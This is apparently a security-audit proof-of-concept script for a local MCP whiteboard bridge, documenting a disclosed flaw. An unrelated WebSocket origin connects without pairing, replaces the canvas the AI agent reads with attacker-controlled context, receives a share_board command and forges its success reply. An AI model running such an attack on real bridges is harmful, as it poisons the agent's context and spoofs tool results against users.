// Synthetic local bridge fixtures only; does not open the hosted app.
import assert from 'node:assert/strict'
import { once } from 'node:events'
import { fileURLToPath } from 'node:url'
import { Client } from '../packages/mcp/node_modules/@modelcontextprotocol/sdk/dist/esm/client/index.js'
import { StdioClientTransport } from '../packages/mcp/node_modules/@modelcontextprotocol/sdk/dist/esm/client/stdio.js'
import { WebSocket } from '../packages/mcp/node_modules/ws/wrapper.mjs'

const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL('../packages/mcp/node_modules/tsx/dist/cli.mjs', import.meta.url)),
    fileURLToPath(new URL('../packages/mcp/src/index.ts', import.meta.url))],
  env: { ...process.env, AGENTIC_WHITEBOARD_BRIDGE_PORT: '18787' },
  stderr: 'pipe',
})
const client = new Client({ name: 'security-audit', version: '1.0.0' }, { capabilities: {} })
const sockets = []
const parse = (result) => JSON.parse(result.content[0].text)
async function adapter(origin) {
  const socket = new WebSocket('ws://127.0.0.1:18787', { origin })
  sockets.push(socket)
  await once(socket, 'open')
  return socket
}
try {
  await client.connect(transport)
  const trusted = await adapter('https://whiteboard.example.test')
  const attacker = await adapter('https://unrelated-attacker.example.test')
  attacker.send(JSON.stringify({ type: 'scene', scene: { elements: [{ id: 'forged', text: 'attacker-controlled context' }], appState: {} } }))
  // Synchronize on a round trip through the server, rather than a timed sleep.
  await new Promise((resolve) => { attacker.ping(); attacker.once('pong', resolve) })
  const forged = parse(await client.callTool({ name: 'get_canvas', arguments: { detail: 'full' } }))
  assert.equal(forged.scene.elements[0].id, 'forged')
  console.log('CONFIRMED: unrelated Origin connects without pairing and replaces agent-visible scene')
  const receivedTrusted = new Promise((resolve) => trusted.on('message', (raw) => {
    const message = JSON.parse(raw)
    if (message.type === 'operation') resolve(message.operation)
  }))
  const receivedAttacker = new Promise((resolve) => attacker.on('message', (raw) => {
    const message = JSON.parse(raw)
    if (message.type !== 'operation') return
    attacker.send(JSON.stringify({ type: 'operation_result', operationId: message.operation.id, ok: true, data: { spoofed: true } }))
    resolve(message.operation)
  }))
  const result = parse(await client.callTool({ name: 'share_board', arguments: { generalAccess: 'anyone_with_link' } }))
  const [legitimateOp, leakedOp] = await Promise.all([receivedTrusted, receivedAttacker])
  assert.equal(legitimateOp.id, leakedOp.id)
  assert.equal(leakedOp.type, 'share_board')
  assert.equal(result.spoofed, true)
  console.log('CONFIRMED: command broadcasts to both adapters; unrelated adapter can forge success ACK')
  attacker.close()
  trusted.close()
  await Promise.all(sockets.map((socket) => once(socket, 'close')))
  const stale = parse(await client.callTool({ name: 'get_canvas', arguments: { detail: 'full' } }))
  assert.equal(stale.scene.elements[0].id, 'forged')
  console.log('CONFIRMED: canvas remains readable through MCP after all adapters disconnect')
} finally {
  for (const socket of sockets) socket.terminate()
  await client.close()
  await transport.close()
}
